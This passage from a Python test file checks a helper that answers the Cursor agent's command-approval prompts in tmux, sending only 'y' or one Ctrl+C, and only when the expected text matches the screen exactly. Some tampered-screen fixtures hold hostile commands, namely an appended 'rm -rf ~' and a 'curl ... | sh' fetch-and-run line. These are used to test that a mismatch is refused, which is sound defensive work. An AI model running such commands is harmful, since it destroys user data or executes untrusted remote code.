            "skip missing": {first + 20: ""},
            "command missing": {first + 11: ""},
            "footer inside command": {first + 13: "ctrl+r to review changed files"},
            "another modal": {first + 5: " Permission required"},
            "composer after": {first + 23: ">"},
            "duplicate prompt above": {first + 5: " Run this command?"},
        }
        for label, altered in changes.items():
            with self.subTest(label=label):
                self.restart_case()
                changed = list(rows)
                for i, row in altered.items():
                    changed[i] = row
                self.review_footer_screen(changed)
                inspected = self.start_and_inspect()
                approval = self.case_approval(label)
                code, refused = self.answer_command(inspected["receipt"], text=REVIEW_FOOTER["expectedText"], approval=approval)
                self.assertEqual(code, 2, refused)
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.ledger(approval).exists())
        # A history copy cannot supply the live prompt even with the real footer below it.
        self.restart_case()
        self.review_footer_screen(rows + [""] * 22 + [rows[-2], ""])
        inspected = self.start_and_inspect()
        code, refused = self.answer_command(inspected["receipt"], text=REVIEW_FOOTER["expectedText"])
        self.assertEqual((code, refused["state"]), (2, "stale-prompt"))
        self.assertEqual(self.sends(), [])

    def test_review_footer_refuses_screen_and_expected_co_omissions(self):
        original = REVIEW_FOOTER_ROWS
        offset = len(original) - 24
        for label, index, expected_line in (("command start", offset + 11, 0),
                                             ("skip", offset + 20, -1),
                                             ("question", offset + 14, 2)):
            with self.subTest(label=label):
                self.restart_case()
                rows = list(original)
                del rows[index]
                rows.append("")
                expected = REVIEW_FOOTER["expectedText"].splitlines()
                del expected[expected_line]
                self.review_footer_screen(rows)
                inspected = self.start_and_inspect()
                approval = self.case_approval("co-omission " + label)
                code, refused = self.answer_command(inspected["receipt"], text="\n".join(expected) + "\n", approval=approval)
                self.assertEqual(code, 2, refused)
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.ledger(approval).exists())

    def test_review_footer_with_truncated_history_and_queue(self):
        # More than MAX_LINES captured: complete visible pane, bounded history.
        self.review_footer_screen(["older history"] * 24 + REVIEW_FOOTER_ROWS)
        inspected = self.start_and_inspect()
        self.assertTrue(inspected["truncated"])
        code, answered = self.answer_command(inspected["receipt"], text=REVIEW_FOOTER["expectedText"])
        self.assertEqual((code, answered["state"]), (0, "answered"))
        self.assertEqual(len(self.sends()), 1)
        for label, omit in (("complete", None), ("hint missing", "\u2190/\u2192 to switch approval"),
                            ("header missing", "Approval 1 of 3")):
            with self.subTest(label=label):
                self.restart_case()
                rows = list(QUEUE_ROWS)
                rows[-2] = " " * 48 + "ctrl+r to review changed files"
                expected = QUEUE["expectedText"].splitlines()
                if omit is not None:
                    rows = ["" if r.strip(" ") == omit else r for r in rows]
                    expected.remove(omit)
                self.queue_screen(rows)
                inspected = self.start_and_inspect()
                approval = self.case_approval("footer queue " + label)
                code, result = self.answer_command(inspected["receipt"], text="\n".join(expected) + "\n", approval=approval)
                self.assertEqual(code, 0 if omit is None else 2, result)
                self.assertEqual(len(self.sends()), 1 if omit is None else 0)
                self.assertEqual(self.ledger(approval).exists(), omit is None)

    def test_review_footer_rejection_and_uncertain_send_are_one_shot(self):
        for choice, mode, state in (("ctrl-c", "", "answered"), ("y", "send-fail", "answer-unconfirmed")):
            with self.subTest(choice=choice, mode=mode):
                self.restart_case()
                self.review_footer_screen()
                inspected = self.start_and_inspect()
                approval = self.case_approval(choice + mode)
                args = self.answer_args(inspected["receipt"], choice=choice, kind="modal-approval", approval=approval,
                                        expect=self.command_expect(REVIEW_FOOTER["expectedText"]))
                code, result = self.invoke("answer", args, mode=mode)
                self.assertEqual(result["state"], state)
                self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "C-c"]] if choice == "ctrl-c" else
                                 [["send-keys", "-t", "%7", "-l", "--", "y"]])
                self.invoke("answer", args)
                self.assertEqual(len(self.sends()), 1)

    def test_review_footer_changes_preserve_receipt_and_spent_ledger_fences(self):
        self.review_footer_screen()
        inspected = self.start_and_inspect()
        changed = list(REVIEW_FOOTER_ROWS)
        changed[-2] += " extra"
        self.review_footer_screen(changed)
        code, refused = self.answer_command(inspected["receipt"], text=REVIEW_FOOTER["expectedText"])
        self.assertEqual((code, refused["state"]), (2, "stale-receipt"))
        self.assertFalse(self.ledger().exists())
        self.assertEqual(self.sends(), [])
        self.review_footer_screen()
        inspected = self.inspect_now()
        args = argparse.Namespace(name=self.name, tmux=self.tmux, receipt=inspected["receipt"], approval_ref=APPROVAL,
                                  expect_kind="modal-approval", expect_text_file=str(self.command_expect(REVIEW_FOOTER["expectedText"])),
                                  choice="y", trust_path=None)
        original = helper.spend_approval
        def spend_then_change(path, entry):
            original(path, entry)
            self.capture.write_text("\n".join(changed) + "\n")
        with mock.patch.dict(os.environ, self.env), mock.patch.object(helper, "spend_approval", spend_then_change):
            with self.assertRaises(helper.Refusal) as caught:
                helper.answer_session(args)
        self.assertEqual(caught.exception.state, "prompt-changed")
        self.assertEqual(json.loads(self.ledger().read_text())["outcome"], "not-sent")
        self.assertEqual(self.state()["receipt_id"], "")
        self.assertEqual(self.sends(), [])
        self.review_footer_screen()
        newer = self.inspect_now()
        code, refused = self.answer_command(newer["receipt"], text=REVIEW_FOOTER["expectedText"])
        self.assertEqual((code, refused["state"]), (2, "approval-spent"))
        self.assertEqual(self.sends(), [])

    def test_review_footer_before_error_is_rejection_only(self):
        self.assertEqual(__import__("hashlib").sha256(REVIEW_ERROR["capture"].encode()).hexdigest(),
                         REVIEW_ERROR["captureSha256"])
        self.screen(REVIEW_ERROR["capture"] + "\n", visible=24)
        inspected = self.start_and_inspect()
        code, answered = self.answer_command(inspected["receipt"], choice="ctrl-c", text=REVIEW_ERROR["expectedText"])
        self.assertEqual((code, answered["state"]), (0, "answered"), answered.get("detail"))
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "C-c"]])
        self.answer_command(inspected["receipt"], choice="ctrl-c", text=REVIEW_ERROR["expectedText"])
        self.assertEqual(len(self.sends()), 1)

    def test_review_footer_before_error_keeps_error_and_command_binding(self):
        original = REVIEW_ERROR_ROWS
        expected = REVIEW_ERROR["expectedText"].splitlines()
        first = len(original) - 24
        def omit(label, index):
            rows = list(original); del rows[first + index]; rows.append("")
            line = original[first + index].strip(" ")
            return label, rows, [r for r in expected if r != line], "ctrl-c"
        cases = [
            ("never approve Error", original, expected, "y"),
            ("Error omitted from expected", original, expected[:-4], "ctrl-c"),
            ("footer omitted from expected", original, [r for r in expected if r != helper.COMMAND_REVIEW_FOOTER], "ctrl-c"),
            omit("command co-omitted", 4), omit("Skip co-omitted", 13),
            omit("queue hint co-omitted", 15), omit("queue header co-omitted", 2),
        ]
        for label, footer in (("changed footer", "ctrl+R to review changed files"),
                              ("non-ASCII padding", "\u00a0ctrl+r to review changed files"),
                              ("footer prefix", "extra ctrl+r to review changed files")):
            rows = list(original); rows[first + 17] = footer
            text = [footer if r == helper.COMMAND_REVIEW_FOOTER else r for r in expected]
            cases.append((label, rows, text, "ctrl-c"))
        for label, changes in (("command changed", {4: original[first + 4].replace("date", "echo")}),
                               ("queue index changed", {2: " Approval 2 of 3"}),
                               ("second footer after Error", {23: "ctrl+r to review changed files"}),
                               ("another modal", {23: " Permission required"}),
                               ("extra tail", {23: "  queued: git push"})):
            rows = list(original)
            for i, row in changes.items(): rows[first + i] = row
            cases.append((label, rows, expected, "ctrl-c"))
        # The footer cannot make a footer-only tail into an Error block.
        without_error = [r for r in expected if not r.startswith("Error: ") and r not in expected[-3:]]
        cases.append(("no explicit Error", original, without_error, "ctrl-c"))
        for label, rows, text, choice in cases:
            with self.subTest(label=label):
                self.restart_case()
                self.screen("\n".join(rows) + "\n", visible=24)
                inspected = self.start_and_inspect()
                approval = self.case_approval("review Error " + label)
                code, refused = self.answer_command(inspected["receipt"], choice=choice, text="\n".join(text) + "\n", approval=approval)
                self.assertEqual(code, 2, refused)
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.ledger(approval).exists())

    def test_command_fixture_is_the_captured_shape(self):
        geometry = COMMAND["geometry"]
        self.assertEqual(__import__("hashlib").sha256(COMMAND["capture"].encode("utf-8")).hexdigest(), COMMAND["captureSha256"])
        self.assertEqual((len(COMMAND_ROWS), geometry["history_size"] + geometry["pane_height"]), (62, 62))
        divider, skip = COMMAND["promptRows"]["divider"], COMMAND["promptRows"]["skip"]
        self.assertEqual(COMMAND_ROWS[divider], "\u2500" * geometry["pane_width"])
        self.assertEqual([row.strip() for row in COMMAND_ROWS[divider + 1:skip + 1] if row.strip()],
                         COMMAND["expectedText"].splitlines())
        self.assertEqual(COMMAND_ROWS[skip + 1:], [""] * 4)

    def test_answer_sends_only_y_to_cursors_command_prompt(self):
        self.command_screen()
        inspected = self.start_and_inspect()
        self.assertEqual(inspected["classification"], "modal-approval")
        code, answered = self.answer_command(inspected["receipt"])
        self.assertEqual((code, answered["state"]), (0, "answered"), answered.get("detail"))
        self.assertEqual((answered["kind"], answered["choice"]), ("modal-approval", "y"))
        # One literal y: no Enter, Tab, Shift-Tab or Escape.
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", "y"]])
        self.assertEqual(json.loads(self.ledger().read_text())["outcome"], "sent")
        code, again = self.answer_command(inspected["receipt"])
        self.assertIn((code, again["state"]), {(2, "stale-receipt"), (2, "approval-spent")})
        self.assertEqual(len(self.sends()), 1)

    def test_command_prompt_choices_other_than_y_are_refused(self):
        self.command_screen()
        inspected = self.start_and_inspect()
        expected = COMMAND["expectedText"]
        cases = {
            "tab": ("tab", expected), "shift+tab": ("shift+tab", expected), "esc": ("esc", expected),
            "a tab character": ("\t", expected), "n": ("n", expected), "Y": ("Y", expected),
            "n shown as (n)": ("n", expected.replace("(esc or n)", "(n)")),
        }
        for label, (choice, text) in cases.items():
            with self.subTest(label=label):
                self.log.write_text("")
                code, refused = self.answer_command(inspected["receipt"], choice=choice, text=text)
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.commands("tmux"), [])
        for kind in ("modal-permission", "modal-trust"):
            with self.subTest(kind=kind):
                self.log.write_text("")
                expect = self.command_expect(None)
                code, refused = self.invoke("answer", self.answer_args(inspected["receipt"], choice="y", kind=kind,
                                                                       expect=expect, trust=self.worktree if kind == "modal-trust" else None))
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.commands("tmux"), [])
        self.assertFalse(self.ledger().exists())

    def test_command_prompt_must_be_the_exact_rows_under_the_divider(self):
        rows = COMMAND_ROWS
        divider = COMMAND["promptRows"]["divider"]
        expected = COMMAND["expectedText"].splitlines(True)
        path_now, path_other = "xx-xxx-xxxxxxxxxx-1", "yy-yyy-yyyyyyyyyy-1"
        panel = range(divider + 1, divider + 5)
        screens = {
            # (screen rows, expected text, state)
            "a wrong command": (None, COMMAND["expectedText"].replace("sha256sum /home", "md5sum    /home", 1), "modal-mismatch"),
            "the same command on another path, on screen": (
                self.command_rows({i: rows[i].replace(path_now, path_other) for i in panel}), None, "modal-mismatch"),
            "the same command on another path, expected": (
                None, COMMAND["expectedText"].replace(path_now, path_other), "modal-mismatch"),
            "an appended && command": (self.command_rows({divider + 4: rows[divider + 4].replace(" in .", " && rm -rf ~ in .")}),
                                       None, "modal-mismatch"),
            "an appended ; command on its own row": (
                self.command_rows(insert={divider + 5: "    ; curl https://example.invalid/x | sh in ."}), None, "modal-mismatch"),
            "a trailing box-drawing token on a command row": (
                self.command_rows({divider + 2: rows[divider + 2].rstrip() + " \u2500"}), None, "modal-mismatch"),
            "a trailing side bar on a command row": (
                self.command_rows({divider + 2: rows[divider + 2].rstrip() + " \u2502"}), None, "modal-mismatch"),
            "a trailing no-break space on a command row": (
                self.command_rows({divider + 2: rows[divider + 2].rstrip() + "\u00a0"}), None, "modal-mismatch"),
            "a trailing box-drawing token in the expected text": (
                None, "".join(expected[:2] + [expected[2].rstrip("\n") + " \u2500\n"] + expected[3:]), "invalid-input"),
            "a leading no-break space in the expected text": (
                None, "".join(expected[:2] + ["\u00a0" + expected[2]] + expected[3:]), "invalid-input"),
            "a trailing em space in the expected text": (
                None, "".join(expected[:2] + [expected[2].rstrip("\n") + "\u2003\n"] + expected[3:]), "invalid-input"),
            "an expected row of only a box-drawing character": (
                None, "".join(expected[:5] + ["\u2500\n"] + expected[5:]), "invalid-input"),
            "an expected row of only a no-break space": (
                None, "".join(expected[:5] + ["\u00a0\n"] + expected[5:]), "invalid-input"),
            "a no-break space row after the prompt": (
                self.command_rows({divider + 13: "\u00a0"}), None, "prompt-unclear"),
            "an extra expected row": (None, "".join(expected[:5] + ["Allow network access\n"] + expected[5:]), "modal-mismatch"),
            "a missing middle row": (None, "".join(expected[:5] + expected[6:]), "modal-mismatch"),
            "the first command row left out": (None, "".join(expected[1:]), "prompt-unclear"),
            "the Skip row left out": (None, "".join(expected[:-1]), "prompt-unclear"),
            "cropped: the first command row gone": (self.command_rows(drop=[divider + 1]), None, "modal-mismatch"),
            "cropped: the Skip row gone": (self.command_rows(drop=[divider + 11]), None, "modal-mismatch"),
            "no divider above": (self.command_rows({divider: ""}), None, "prompt-unclear"),
            "a divider one column short": (self.command_rows({divider: "\u2500" * 79}), None, "prompt-unclear"),
            "a heavy divider": (self.command_rows({divider: "\u2501" * 80}), None, "prompt-unclear"),
            "a blank row under the divider": (self.command_rows(insert={divider + 1: ""}), None, "prompt-unclear"),
            "text after the prompt": (self.command_rows({divider + 13: "  queued: git push"}), None, "prompt-unclear"),
            "a second prompt above the divider": (self.command_rows({39: " Run this command?"}), None, "prompt-unclear"),
            "the prompt shown twice": (rows[11:divider] + rows[divider + 1:divider + 12] + rows[divider:], None,
                                       "prompt-unclear"),
        }
        for label, (screen, text, state) in screens.items():
            with self.subTest(label=label):
                self.restart_case()
                self.command_screen(screen)
                inspected = self.start_and_inspect()
                approval = self.case_approval(label)
                code, refused = self.answer_command(inspected["receipt"], text=text, approval=approval)
                self.assertEqual((code, refused["state"]), (2, state))
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.ledger(approval).exists())

    def test_command_prompt_in_a_box_is_refused(self):
        divider, skip = COMMAND["promptRows"]["divider"], COMMAND["promptRows"]["skip"]
        panel = [row.strip() for row in COMMAND_ROWS[divider + 1:skip + 1]]
        cases = {
            "the prompt in a box": boxed(panel).splitlines(),
            "the prompt in a box in a box": boxed(boxed(panel).splitlines()).splitlines(),
        }
        for label, drawn in cases.items():
            with self.subTest(label=label):
                rows = COMMAND_ROWS[:divider + 1] + drawn
                rows = rows[len(rows) + 4 - len(COMMAND_ROWS):] + [""] * 4
                self.restart_case()
                self.command_screen(rows)
                inspected = self.start_and_inspect()
                code, refused = self.answer_command(inspected["receipt"], approval=self.case_approval(label))
                self.assertEqual((code, refused["state"]), (2, "prompt-unclear"))
                self.assertEqual(self.sends(), [])
        with self.subTest(label="the divider and the prompt inside a box"):
            # A box around both: its top border above the divider, its bottom border after the prompt.
            rows = list(COMMAND_ROWS)
            rows[divider - 1] = "  \u256d" + "\u2500" * 74 + "\u256e"
            rows[skip + 1] = "  \u2570" + "\u2500" * 74 + "\u256f"
            self.restart_case()
            self.command_screen(rows)
            inspected = self.start_and_inspect()
            code, refused = self.answer_command(inspected["receipt"], approval=self.case_approval("divider in box"))
            self.assertEqual((code, refused["state"]), (2, "prompt-unclear"))
            self.assertEqual(self.sends(), [])
        with self.subTest(label="a boxed approval prompt with (y) only"):
            self.restart_case()
            self.screen(APPROVAL_SCREEN.replace("[y] Yes", "Yes (y)").replace("[n] No", "No (n)"))
            inspected = self.start_and_inspect()
            text = APPROVAL_EXPECT.replace("[y] Yes", "Yes (y)").replace("[n] No", "No (n)")
            code, refused = self.answer_command(inspected["receipt"], text=text, approval=self.case_approval("boxed"))
            self.assertEqual((code, refused["state"]), (2, "prompt-unclear"))
            self.assertEqual(self.sends(), [])

    def test_command_prompt_stale_receipt_and_layout(self):
        self.command_screen()
        inspected = self.start_and_inspect()
        divider = COMMAND["promptRows"]["divider"]
        self.command_screen(self.command_rows({divider - 2: "  $ sha256sum (re-drawn)"}))
        code, stale = self.answer_command(inspected["receipt"])
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.command_screen()
        newer = self.inspect_now()
        # A resize (a new pane width) after inspect is a different layout.
        self.env["FAKE_WIDTH"] = "100"
        code, resized = self.answer_command(newer["receipt"])
        self.assertEqual((code, resized["state"]), (2, "stale-receipt"))
        self.assertEqual(self.sends(), [])
        self.assertFalse(self.ledger().exists())

    # Cursor's queued command approvals (2026-11-05T20:36:55Z): the expected text holds the
    # "Approval N of M" row and the switch hint, so it binds the index and the count; only y,
    # Run (once) for the shown approval, is ever sent, never an arrow key.

    def queue_rows(self, changes=None, insert=None):
        rows = list(QUEUE_ROWS)
        for index, row in (changes or {}).items():
            rows[index] = row
        for index, row in (insert or {}).items():
            rows.insert(index, row)
            del rows[0]
        self.assertEqual(len(rows), len(QUEUE_ROWS))
        return rows

    def queue_screen(self, rows=None):
        self.screen("\n".join(QUEUE_ROWS if rows is None else rows) + "\n", visible=24)

    def test_queue_fixture_is_the_captured_shape(self):
        geometry, rows = QUEUE["geometry"], QUEUE["promptRows"]
        self.assertEqual(__import__("hashlib").sha256(QUEUE["capture"].encode("utf-8")).hexdigest(), QUEUE["captureSha256"])
        self.assertEqual(len(QUEUE_ROWS), geometry["history_size"] + geometry["pane_height"])
        self.assertEqual(QUEUE_ROWS[rows["divider"]], "\u2500" * geometry["pane_width"])
        self.assertEqual(QUEUE_ROWS[rows["header"]], " Approval 1 of 3")
        self.assertEqual(QUEUE_ROWS[rows["hint"]], " \u2190/\u2192 to switch approval")
        self.assertEqual([row.strip(" ") for row in QUEUE_ROWS[rows["divider"] + 1:rows["hint"] + 1] if row.strip(" ")],
                         QUEUE["expectedText"].splitlines())
        self.assertEqual(QUEUE_ROWS[rows["hint"] + 1:], [""] * 2)

    def test_answer_sends_only_y_to_the_shown_queued_approval(self):
        self.queue_screen()
        inspected = self.start_and_inspect()
        self.assertEqual(inspected["classification"], "modal-approval")
        code, answered = self.answer_command(inspected["receipt"], text=QUEUE["expectedText"])
        self.assertEqual((code, answered["state"]), (0, "answered"), answered.get("detail"))
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", "y"]])

    def test_queued_approval_must_match_index_count_and_command(self):
        rows, expected = QUEUE["promptRows"], QUEUE["expectedText"]
        header, hint, skip = rows["header"], rows["hint"], rows["skip"]
        lines = expected.splitlines(True)
        screens = {
            # (screen rows, expected text, state)
            "another index expected": (None, expected.replace("Approval 1 of 3", "Approval 2 of 3"), "modal-mismatch"),
            "another index shown": (self.queue_rows({header: " Approval 2 of 3"}), None, "modal-mismatch"),
            "a changed count shown": (self.queue_rows({header: " Approval 1 of 2"}), None, "modal-mismatch"),
            "a changed count expected": (None, expected.replace("of 3", "of 4"), "modal-mismatch"),
            "a changed command shown": (self.queue_rows({header + 2: QUEUE_ROWS[header + 2].replace("sha256sum", "md5sum   ")}),
                                        None, "modal-mismatch"),
            "an appended command shown": (self.queue_rows({header + 5: QUEUE_ROWS[header + 5].replace(" in .", " && rm -rf ~ in .")}),
                                          None, "modal-mismatch"),
            "the header left out of the expected text": (None, "".join(lines[1:]), "invalid-input"),
            "the hint left out of the expected text": (None, "".join(lines[:-1]), "invalid-input"),
            "the header and hint left out": (None, "".join(lines[1:-1]), "prompt-unclear"),
            "the header not first": (None, "".join(lines[1:2] + lines[:1] + lines[2:]), "invalid-input"),
            "the hint not last": (None, "".join(lines[:-2] + lines[-1:] + lines[-2:-1]), "invalid-input"),
            "a hint in the middle": (None, "".join(lines[:5] + lines[-1:] + lines[5:]), "invalid-input"),
            "a header over its count": (None, expected.replace("Approval 1 of 3", "Approval 4 of 3"), "invalid-input"),
            "a queue of one": (None, expected.replace("Approval 1 of 3", "Approval 1 of 1"), "invalid-input"),
            "two headers": (None, "".join(lines[:1] + lines), "invalid-input"),
            "no header on screen": (self.queue_rows({header: ""}), None, "modal-mismatch"),
            "no hint on screen": (self.queue_rows({hint: ""}), None, "modal-mismatch"),
            "text after the hint": (self.queue_rows({hint + 1: "  queued: git push"}), None, "prompt-unclear"),
            "a second prompt above the divider": (self.queue_rows({rows["divider"] - 3: " Run this command?"}), None,
                                                  "prompt-unclear"),
            "a trailing box-drawing token on the header": (self.queue_rows({header: " Approval 1 of 3 \u2500"}), None,
                                                           "modal-mismatch"),
        }
        self.assertEqual(skip + 2, hint)
        for label, (screen, text, state) in screens.items():
            with self.subTest(label=label):
                self.restart_case()
                self.queue_screen(screen)
                inspected = self.start_and_inspect()
                approval = self.case_approval(label)
                code, refused = self.answer_command(inspected["receipt"], text=expected if text is None else text,
                                                    approval=approval)
                self.assertEqual((code, refused["state"]), (2, state))
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.ledger(approval).exists())

    def test_queued_approval_choices_other_than_y_are_refused(self):
        self.queue_screen()
        inspected = self.start_and_inspect()
        for choice in ("\u2190", "\u2192", "tab", "n", "Y", "\t"):
            with self.subTest(choice=repr(choice)):
                self.log.write_text("")
                code, refused = self.answer_command(inspected["receipt"], choice=choice, text=QUEUE["expectedText"])
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.commands("tmux"), [])

    def test_queued_approval_stale_receipt(self):
        self.queue_screen()
        inspected = self.start_and_inspect()
        # The first approval answered elsewhere: the queue now shows 1 of 2.
        self.queue_screen(self.queue_rows({QUEUE["promptRows"]["header"]: " Approval 1 of 2"}))
        code, stale = self.answer_command(inspected["receipt"], text=QUEUE["expectedText"])
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.assertEqual(self.sends(), [])

    # Rejecting the shown command with one Ctrl+C (OP399 SK3, 2026-11-05): Cursor reads it as
    # reject for the active decision only. Under the "Agent stopped retrying" footer only a
    # rejection is answered.

    def aborted_rows(self, changes=None):
        rows = list(ABORTED_ROWS)
        for index, row in (changes or {}).items():
            rows[index] = row
        return rows

    def single_stale_rows(self):
        """The remaining stale decision alone: no counter row and no switch hint (synthetic,
        derived from the captured screen: Cursor draws both only for more than one)."""
        rows = list(ABORTED_ROWS)
        prompt = ABORTED["promptRows"]
        del rows[prompt["hint"] - 1:prompt["hint"] + 1]
        del rows[prompt["header"]:prompt["header"] + 2]
        return [""] * 4 + rows

    def single_stale_text(self):
        lines = ABORTED["expectedText"].splitlines(True)
        return "".join(line for line in lines if not line.startswith(("Approval ", "\u2190/\u2192")))

    def answer_reject(self, receipt, text, approval=APPROVAL, kind="modal-approval"):
        return self.invoke("answer", self.answer_args(receipt, choice="ctrl-c", kind=kind, approval=approval,
                                                      expect=self.command_expect(text)))

    def test_aborted_fixture_is_the_captured_shape(self):
        geometry, prompt = ABORTED["geometry"], ABORTED["promptRows"]
        self.assertEqual(__import__("hashlib").sha256(ABORTED["capture"].encode("utf-8")).hexdigest(),
                         ABORTED["captureSha256"])
        self.assertEqual(len(ABORTED_ROWS), geometry["history_size"] + geometry["pane_height"])
        self.assertEqual(ABORTED_ROWS[prompt["divider"]], "\u2500" * geometry["pane_width"])
        self.assertEqual(ABORTED_ROWS[prompt["header"]], " Approval 1 of 2")
        self.assertEqual(ABORTED_ROWS[prompt["footer"]].strip(" "), "Error: Agent stopped retrying")
        self.assertEqual([row.strip(" ") for row in ABORTED_ROWS[prompt["divider"] + 1:] if row.strip(" ")],
                         ABORTED["expectedText"].splitlines())

    def test_reject_sends_only_ctrl_c_to_the_shown_stale_decision(self):
        cases = {"two stale decisions": (None, ABORTED["expectedText"]),
                 "the last stale decision": (self.single_stale_rows(), self.single_stale_text())}
        for label, (rows, text) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.queue_screen(ABORTED_ROWS if rows is None else rows)
                inspected = self.start_and_inspect()
                code, answered = self.answer_reject(inspected["receipt"], text, approval=self.case_approval(label))
                self.assertEqual((code, answered["state"]), (0, "answered"), answered.get("detail"))
                self.assertEqual(answered["choice"], "ctrl-c")
                # One Ctrl+C: no y, Enter, n, Escape or arrow key.
                self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "C-c"]])
                code, again = self.answer_reject(inspected["receipt"], text, approval=self.case_approval(label))
                self.assertIn((code, again["state"]), {(2, "stale-receipt"), (2, "approval-spent")})
                self.assertEqual(len(self.sends()), 1)

    def test_reject_of_a_live_queued_decision_is_bound_the_same_way(self):
        self.queue_screen()
        inspected = self.start_and_inspect()
        code, answered = self.answer_reject(inspected["receipt"], QUEUE["expectedText"])
        self.assertEqual((code, answered["state"]), (0, "answered"), answered.get("detail"))
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "C-c"]])

    def test_stale_decisions_are_never_approved_and_rejects_are_bound(self):
        prompt, expected = ABORTED["promptRows"], ABORTED["expectedText"]
        lines = expected.splitlines(True)
        footer = lines.index("Error: Agent stopped retrying\n")
        without_footer = "".join(lines[:footer])
        header, divider = prompt["header"], prompt["divider"]
        cases = {
            # (choice, screen rows, expected text, state)
            "y under the footer, footer expected": ("y", None, expected, "invalid-input"),
            "y under the footer, footer left out": ("y", None, without_footer, "prompt-unclear"),
            "ctrl-c with the footer left out": ("ctrl-c", None, without_footer, "prompt-unclear"),
            "another index expected": ("ctrl-c", None, expected.replace("Approval 1 of 2", "Approval 2 of 2"),
                                       "modal-mismatch"),
            "a changed count shown": ("ctrl-c", self.aborted_rows({header: " Approval 1 of 3"}), None, "modal-mismatch"),
            "a changed command shown": ("ctrl-c", self.aborted_rows(
                {header + 2: ABORTED_ROWS[header + 2].replace("sha256sum", "md5sum   ")}), None, "modal-mismatch"),
            "a changed footer shown": ("ctrl-c", self.aborted_rows(
                {prompt["footer"]: "  Error: Agent stopped"}), None, "modal-mismatch"),
            "the footer before the Skip row": ("ctrl-c", None, "".join(lines[:3] + lines[footer:footer + 1] + lines[3:footer]
                                                                     + lines[footer + 1:]), "invalid-input"),
            "the footer twice": ("ctrl-c", None, "".join(lines + lines[footer:footer + 1]), "invalid-input"),
            "the footer first": ("ctrl-c", None, "".join(lines[footer:footer + 1] + lines[:footer] + lines[footer + 1:]),
                                 "invalid-input"),
            "no divider above": ("ctrl-c", self.aborted_rows({divider: ""}), None, "prompt-unclear"),
            "text after the footer": ("ctrl-c", self.aborted_rows({prompt["footer"] + 4: "  queued: git push"}), None,
                                      "prompt-unclear"),
            "y under another turn error footer": ("y", self.aborted_rows({prompt["footer"]: "  Error: Connection failed"}),
                                                  expected.replace("Error: Agent stopped retrying", "Error: Connection failed"),
                                                  "invalid-input"),
            "y with any row after the hint": ("y", None, "".join(lines[:footer] + ["queued: git push\n"]),
                                              "invalid-input"),
            "ctrl-c with a non-error row after the hint": ("ctrl-c", None, "".join(lines[:footer] + ["queued: git push\n"]),
                                                            "invalid-input"),
            "the footer right after the Run row": ("ctrl-c", None, "".join(
                [line for line in lines[:footer] if not line.startswith(("Approval ", "\u2190/\u2192", "Add Shell",
                                                                         "Run Everything", "Skip &"))]
                + lines[footer:]), "invalid-input"),
            "a raw Ctrl+C byte": ("\x03", None, expected, "invalid-input"),
            "a tmux key name": ("C-c", None, expected, "invalid-input"),
            "a caret form": ("^C", None, expected, "invalid-input"),
            "n": ("n", None, expected, "invalid-input"),
        }
        for label, (choice, screen, text, state) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.queue_screen(ABORTED_ROWS if screen is None else screen)
                inspected = self.start_and_inspect()
                approval = self.case_approval(label)
                code, refused = self.invoke("answer", self.answer_args(
                    inspected["receipt"], choice=choice, kind="modal-approval", approval=approval,
                    expect=self.command_expect(expected if text is None else text)))
                self.assertEqual((code, refused["state"]), (2, state))
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.ledger(approval).exists())

    def test_reject_is_only_for_cursors_command_prompt(self):
        for kind in ("modal-permission", "modal-trust"):
            with self.subTest(kind=kind):
                self.restart_case()
                self.queue_screen(ABORTED_ROWS)
                inspected = self.start_and_inspect()
                code, refused = self.answer_reject(inspected["receipt"], ABORTED["expectedText"], kind=kind,
                                                   approval=self.case_approval(kind))
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.sends(), [])
        with self.subTest(kind="a box that shows [ctrl-c]"):
            self.restart_case()
            screen, text = APPROVAL_SCREEN.replace("[y] Yes", "[ctrl-c] Yes"), APPROVAL_EXPECT.replace("[y] Yes", "[ctrl-c] Yes")
            self.screen(screen)
            inspected = self.start_and_inspect()
            code, refused = self.answer_reject(inspected["receipt"], text, approval=self.case_approval("box ctrl-c"))
            self.assertEqual((code, refused["state"]), (2, "invalid-input"))
            self.assertEqual(self.sends(), [])
        with self.subTest(kind="a boxed approval prompt"):
            self.restart_case()
            self.screen(APPROVAL_SCREEN)
            inspected = self.start_and_inspect()
            code, refused = self.answer_reject(inspected["receipt"], APPROVAL_EXPECT, approval=self.case_approval("box"))
            self.assertEqual((code, refused["state"]), (2, "invalid-input"))
            self.assertEqual(self.sends(), [])

    def test_reject_stale_receipt(self):
        self.queue_screen(ABORTED_ROWS)
        inspected = self.start_and_inspect()
        # One decision rejected elsewhere: the screen now shows the last one alone.
        self.queue_screen(self.single_stale_rows())
        code, stale = self.answer_reject(inspected["receipt"], ABORTED["expectedText"])
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.assertEqual(self.sends(), [])

    def wait_for_literal_send(self, timeout=20):
        """Block until the helper has typed the literal text (a send-keys -l in the fake log),
        so a test changes the pane only after the pre-send checks, never during them."""
        deadline = __import__("time").monotonic() + timeout
        while __import__("time").monotonic() < deadline:
            if any(args[0] == "send-keys" and "-l" in args for args in self.commands("tmux")):
                return
            __import__("time").sleep(0.01)
        raise AssertionError("the helper never typed the literal text")

    def submit(self, text, *flags, screen="  Cursor Agent\n\n> \n"):
        if screen is not None:
            self.screen(screen)
        self.text_path.write_text(text)
        inspected = self.start_and_inspect()
        return self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
